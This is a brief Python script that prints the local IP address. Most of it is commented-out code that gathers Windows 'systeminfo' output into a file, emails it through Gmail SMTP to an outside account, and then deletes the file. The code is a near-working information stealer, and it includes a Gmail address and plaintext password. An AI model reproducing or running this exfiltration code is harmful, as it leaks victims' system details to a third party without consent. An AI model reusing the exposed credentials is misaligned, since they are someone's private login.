import socket

# import subprocess
# import smtplib
# from email.mime.multipart import MIMEMultipart
# from email.mime.text import MIMEText
# from email.mime.base import MIMEBase
# # from email import encoders
# import os

# def send_error(error):
#     keys = f"""
#                {error}
#               """
#     message = MIMEMultipart()
#     message['From'] = 'code_scrapper'
#     message['to'] = 'malwarefinder3@gmail.com'
#     message['subject'] = 'Error'
#     message.attach(MIMEText(keys, 'plain'))
#     attach_file_name = 'error.txt'
#     attach_file = open(attach_file_name, 'r')
#     payload = MIMEBase('application', 'octate-stream')
#     payload.set_payload((attach_file).read())
#     payload.add_header('Content-Decomposition', 'attachment', filename=attach_file_name)
#     message.attach(payload)
#     text = message.as_string()
#     server = smtplib.SMTP('smtp.gmail.com', 587)
#     server.starttls()
#     server.login(user='malwarefinder3@gmail.com', password='3101331013')
#     server.sendmail('malwarefinder3@gmail.com', 'malwarefinder3@gmail.com', msg = text)
#     server.quit()


# Id = subprocess.check_output(['systeminfo']).decode('utf-8').split('\n')
# new = []
# mail_file = 'error.txt'
# for item in Id:
#   new.append(str(item.split("\r")[:-1]))
# for i in new:
#   mf = open(mail_file, 'a')
#   mf.write(i[2:-2])
# mf.close()
# e = "hello world from python test"
# send_error(e)
# mf.close()
# os.remove('error.txt')

ipaddress = socket.gethostbyname(socket.gethostname())
print(ipaddress)
print(dir(socket))